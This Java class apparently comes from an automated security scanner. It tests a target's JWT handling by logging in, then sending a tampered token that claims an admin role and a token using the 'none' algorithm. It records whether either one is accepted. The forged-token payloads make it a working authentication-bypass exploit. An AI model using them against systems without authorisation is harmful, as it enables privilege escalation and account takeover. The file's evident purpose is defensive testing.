package attacks;

import config.AttackConfig;
import model.AttackResult;
import model.StrideCategory;
import util.HttpUtil;

public class JwtTokenAttack {

    public static AttackResult run(AttackConfig config) {

        String authEndpoint = config.authMeEndpoint;
        String loginUrl     = config.targetUrl + config.loginEndpoint;
        String authUrl      = config.targetUrl + authEndpoint;

        String loginPayload = """
        {
          "username": "testuser",
          "password": "TestPassword123!"
        }
        """;

        String loginResponse = HttpUtil.post(loginUrl, loginPayload);
        String token = extractToken(loginResponse);

        if (token == null || token.isEmpty()) {
            return new AttackResult("JWT Token Security", false,
                "Could not obtain JWT token for testing. "
                + "Authentication may not use JWT or credentials invalid",
                StrideCategory.SPOOFING, "JwtTokenAttack", authEndpoint);
        }

        String[] parts = token.split("\\.");
        if (parts.length != 3) {
            return new AttackResult("JWT Token Security", false,
                "Token format unexpected. May not be a JWT token",
                StrideCategory.SPOOFING, "JwtTokenAttack", authEndpoint);
        }

        // Test tampered payload
        String tamperedToken = parts[0] + ".eyJ1c2VySWQiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiJ9." + parts[2];
        String authResponse  = HttpUtil.getWithAuth(authUrl, tamperedToken);

        if (authResponse.contains("success") || authResponse.contains("admin") ||
            (!authResponse.contains("401") && !authResponse.contains("403")
                && !authResponse.contains("invalid"))) {

            return new AttackResult("JWT Token Security", true,
                "JWT token validation vulnerability. Tampered token accepted. "
                + "Signature not properly verified",
                StrideCategory.SPOOFING, "JwtTokenAttack", authEndpoint);
        }

        // Test 'none' algorithm
        String noneAlgHeader = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"; // {"alg":"none","typ":"JWT"}
        String noneToken     = noneAlgHeader + "." + parts[1] + ".";
        authResponse = HttpUtil.getWithAuth(authUrl, noneToken);

        if (authResponse.contains("success") ||
            (!authResponse.contains("401") && !authResponse.contains("403")
                && !authResponse.contains("invalid"))) {

            return new AttackResult("JWT Token Security", true,
                "Critical JWT vulnerability. 'none' algorithm accepted. "
                + "Tokens can be forged without signature",
                StrideCategory.SPOOFING, "JwtTokenAttack", authEndpoint);
        }

        return new AttackResult("JWT Token Security", false,
            "JWT tokens properly validated. Tampered tokens and 'none' algorithm rejected",
            StrideCategory.SPOOFING, "JwtTokenAttack", authEndpoint);
    }

    private static String extractToken(String response) {
        if (response.contains("token")) {
            int tokenStart = response.indexOf("token") + 8;
            int nextQuote  = response.indexOf("\"", tokenStart);
            if (nextQuote > tokenStart) {
                String possible = response.substring(tokenStart, nextQuote);
                if (possible.split("\\.").length == 3) return possible;
            }
        }
        return null;
    }
}
